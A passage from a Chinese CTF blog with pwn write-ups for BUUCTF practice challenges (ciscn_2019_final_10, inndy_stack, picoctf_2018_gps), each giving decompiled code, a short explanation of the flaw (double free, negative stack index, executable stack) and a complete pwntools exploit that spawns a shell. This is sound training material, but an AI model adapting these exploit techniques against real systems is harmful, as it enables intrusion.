class="line">  v4 = sub_CCF();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)check_v1(v4) == <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Access granted!"</span>);</span><br><span class="line">    s1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">    <span class="built_in">strcpy</span>(s1, <span class="string">"The cake is not a lie!"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)check_v1(v4) )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Access denied."</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure>

<p>通过后面的逻辑可以知道需要过<code>check_v1(v4)为1</code>，但是第一个那里<code>v1</code>不能为0，但是<code>(int)v1 &gt; 255</code>把v1转换成了有符号，所以可以输入负数</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test    ax, ax</span><br></pre></td></tr></tbody></table></figure>

<p>然后在check_v1这个函数里是ax，所以输入-0x10000，这样子的话就可以成功<code>check_v1(v4) == 1</code></p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_EA0</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="keyword">if</span> ( dword_202010 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">free</span>(ptr);                                    <span class="comment">// uaf</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)--dword_202010;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>漏洞点两次uaf，利用double free打<code>The cake is not a lie!</code>为<code>The cake is a lie!</code>，最后用\x00来绕过算法执行shellcode</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./ciscn_final_10'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">25754</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'&gt; '</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(menu, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(menu, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">dbgg()</span><br><span class="line">r.sendlineafter(menu, <span class="string">'1234'</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(menu, <span class="built_in">str</span>(-<span class="number">0x10000</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'\x90'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'The cake is a lie!\x00'</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(menu, <span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">r.sendlineafter(menu, <span class="string">b'\x00\x0c'</span> + shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="inndy-stack"><a href="#inndy-stack" class="headerlink" title="inndy_stack"></a>inndy_stack</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">stack_pop</span><span class="params">(_DWORD *<span class="built_in">stack</span>)</span></span><br><span class="line">{</span><br><span class="line">  --*<span class="built_in">stack</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">stack</span>[*<span class="built_in">stack</span> + <span class="number">1</span>];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>pop的时候可以负溢</p>
<p>泄露出libc之后clear，然后再利用pop负溢，打push的返回地址为ogg，需要注意整数表现</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./stack'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">29863</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'Cmd &gt;&gt;\n'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">value</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'i '</span> + <span class="built_in">str</span>(value))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop</span>():</span><br><span class="line">    r.sendlineafter(menu, <span class="string">b'p'</span>)</span><br><span class="line"></span><br><span class="line">dbgg()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    pop()</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'Pop -&gt; '</span>)</span><br><span class="line">_IO_2_1_stdout_addr = <span class="built_in">int</span>(r.recv(<span class="number">10</span>), <span class="number">10</span>) + <span class="number">0x100000000</span></span><br><span class="line">li(<span class="string">'_IO_2_1_stdout_addr = '</span> + <span class="built_in">hex</span>(_IO_2_1_stdout_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF('./2.23/libc-2.23.so')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">libc_base = _IO_2_1_stdout_addr - libc.sym[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">li(<span class="string">'libc_base = '</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#one = [0x3ac6c, 0x3ac6e, 0x3ac72, 0x3ac79, 0x5fbd5, 0x5fbd6]</span></span><br><span class="line">one = [<span class="number">0x3a80c</span>, <span class="number">0x3a80e</span>, <span class="number">0x3a812</span>, <span class="number">0x3a819</span>, <span class="number">0x5f065</span>, <span class="number">0x5f066</span>]</span><br><span class="line">one_gadget = one[<span class="number">1</span>] + libc_base</span><br><span class="line">li(<span class="string">'one_gadget = '</span> + <span class="built_in">hex</span>(one_gadget))</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">li(<span class="string">'system_addr = '</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">b'/bin/sh'</span>).__next__()</span><br><span class="line"></span><br><span class="line">r.sendlineafter(menu, <span class="string">'c'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    pop()</span><br><span class="line"></span><br><span class="line">one_gadget = <span class="number">0x100000000</span> - one_gadget</span><br><span class="line">push(-one_gadget)</span><br><span class="line"><span class="comment">#push(0x12345678)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="picoctf-2018-gps"><a href="#picoctf-2018-gps" class="headerlink" title="picoctf_2018_gps"></a>picoctf_2018_gps</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> *position; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> (*v5)(<span class="type">void</span>); <span class="comment">// [rsp+8h] [rbp-1018h] BYREF</span></span><br><span class="line">  <span class="type">char</span> seed[<span class="number">4104</span>]; <span class="comment">// [rsp+10h] [rbp-1010h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+1018h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  srand((<span class="type">unsigned</span> <span class="type">int</span>)seed);</span><br><span class="line">  initialize();</span><br><span class="line">  acquire_satellites();</span><br><span class="line">  position = query_position();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"We need to access flag.txt.\nCurrent position: %p\n"</span>, position);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What's your plan?\n&gt; "</span>);</span><br><span class="line">  fgets(seed, <span class="number">0x1000</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Where do we start?\n&gt; "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%p"</span>, &amp;v5);</span><br><span class="line">  v5();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>会去执行一个地址，然后会泄露出stack上的地址，栈上有rwx，所以直接ret2shellcode，nop滑行即可</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./PicoCTF_2018_gps'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">29827</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">dbgg()</span><br><span class="line">r.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">leak_addr = <span class="built_in">int</span>(r.recv(<span class="number">12</span>), <span class="number">16</span>) + <span class="number">0x200</span></span><br><span class="line">li(<span class="string">'leak_addr = '</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'\x90'</span> * <span class="number">0x950</span> + asm(shellcraft.sh())</span><br><span class="line">r.sendlineafter(<span class="string">'&gt; '</span>, p1)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'&gt; '</span>, <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>



</font>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li>
         
          <li><a href="/links/">links</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0"><span class="toc-number">1.</span> <span class="toc-text">buuctf之pwn题(持续更新)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%B9%8F%E5%9F%8E%E6%9D%AF-2018-note"><span class="toc-number">1.1.</span> <span class="toc-text">鹏城杯_2018_note</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%B9%8F%E5%9F%8E%E6%9D%AF-2018-overint"><span class="toc-number">1.2.</span> <span class="toc-text">鹏城杯_2018_overint</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%B9%8F%E5%9F%8E%E6%9D%AF-2018-easycalc"><span class="toc-number">1.3.</span> <span class="toc-text">鹏城杯_2018_easycalc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BSidesCF-2019Slowfire"><span class="toc-number">1.4.</span> <span class="toc-text">BSidesCF_2019Slowfire</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#suctf-2018-easy-overflow-file-structure"><span class="toc-number">1.5.</span> <span class="toc-text">suctf_2018_easy_overflow_file_structure</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#csaw2018-shell-code"><span class="toc-number">1.6.</span> <span class="toc-text">csaw2018_shell_code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#actf-2020-scp-foundation-secret"><span class="toc-number">1.7.</span> <span class="toc-text">actf_2020_scp_foundation_secret</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cscctf-2019-qual-babyheap"><span class="toc-number">1.8.</span> <span class="toc-text">cscctf_2019_qual_babyheap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cscctf-2019-final-babyprintf"><span class="toc-number">1.9.</span> <span class="toc-text">cscctf_2019_final_babyprintf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wdb-2018-4th-pwn2"><span class="toc-number">1.10.</span> <span class="toc-text">wdb_2018_4th_pwn2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#greeting-mna-2016"><span class="toc-number">1.11.</span> <span class="toc-text">greeting_mna_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-of-sci-volga-2016"><span class="toc-number">1.12.</span> <span class="toc-text">web_of_sci_volga_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnable-free-spirit"><span class="toc-number">1.13.</span> <span class="toc-text">pwnable_free_spirit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnable-loveletter"><span class="toc-number">1.14.</span> <span class="toc-text">pwnable_loveletter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-s-2"><span class="toc-number">1.15.</span> <span class="toc-text">ciscn_2019_s_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#suctf2018-heap"><span class="toc-number">1.16.</span> <span class="toc-text">suctf2018_heap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#qctf-2018-noleak"><span class="toc-number">1.17.</span> <span class="toc-text">qctf_2018_noleak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-guess"><span class="toc-number">1.18.</span> <span class="toc-text">jarvisoj_guess</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnable-bf"><span class="toc-number">1.19.</span> <span class="toc-text">pwnable_bf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cscctf-2019-qual-signal"><span class="toc-number">1.20.</span> <span class="toc-text">cscctf_2019_qual_signal</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#qwb2019-one"><span class="toc-number">1.21.</span> <span class="toc-text">qwb2019_one</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0ctf2017-easiestprintf"><span class="toc-number">1.22.</span> <span class="toc-text">0ctf2017_easiestprintf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ycb-2020-easy-heap"><span class="toc-number">1.23.</span> <span class="toc-text">ycb_2020_easy_heap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hxb-pwn300"><span class="toc-number">1.24.</span> <span class="toc-text">hxb_pwn300</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-ne-6"><span class="toc-number">1.25.</span> <span class="toc-text">ciscn_2019_ne_6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnable-secret-of-my-heart"><span class="toc-number">1.26.</span> <span class="toc-text">pwnable_secret_of_my_heart</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnable-otp"><span class="toc-number">1.27.</span> <span class="toc-text">pwnable_otp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-final-9"><span class="toc-number">1.28.</span> <span class="toc-text">ciscn_2019_final_9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hack-lu-2018-heap-heaven"><span class="toc-number">1.29.</span> <span class="toc-text">hack_lu_2018_heap_heaven</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#suctf-2019-playfmt"><span class="toc-number">1.30.</span> <span class="toc-text">suctf_2019_playfmt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnable-dubblesort"><span class="toc-number">1.31.</span> <span class="toc-text">pwnable_dubblesort</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#whctf2017-note-sys"><span class="toc-number">1.32.</span> <span class="toc-text">whctf2017_note_sys</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#roarctf-2019-easyrop"><span class="toc-number">1.33.</span> <span class="toc-text">roarctf_2019_easyrop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#others-pwn1"><span class="toc-number">1.34.</span> <span class="toc-text">others_pwn1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rctf2018-babyheap"><span class="toc-number">1.35.</span> <span class="toc-text">rctf2018_babyheap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#arr-sun-2016"><span class="toc-number">1.36.</span> <span class="toc-text">arr_sun_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnable-dragon"><span class="toc-number">1.37.</span> <span class="toc-text">pwnable_dragon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-calc-exe"><span class="toc-number">1.38.</span> <span class="toc-text">jarvisoj_calc.exe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-sw-10"><span class="toc-number">1.39.</span> <span class="toc-text">ciscn_2019_sw_10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-final-10"><span class="toc-number">1.40.</span> <span class="toc-text">ciscn_2019_final_10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#inndy-stack"><span class="toc-number">1.41.</span> <span class="toc-text">inndy_stack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#picoctf-2018-gps"><span class="toc-number">1.42.</span> <span class="toc-text">picoctf_2018_gps</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;text=buuctf之pwn题(持续更新)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;title=buuctf之pwn题(持续更新)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;is_video=false&amp;description=buuctf之pwn题(持续更新)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=buuctf之pwn题(持续更新)&amp;body=Check out this article: http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;title=buuctf之pwn题(持续更新)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;title=buuctf之pwn题(持续更新)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;title=buuctf之pwn题(持续更新)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;title=buuctf之pwn题(持续更新)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
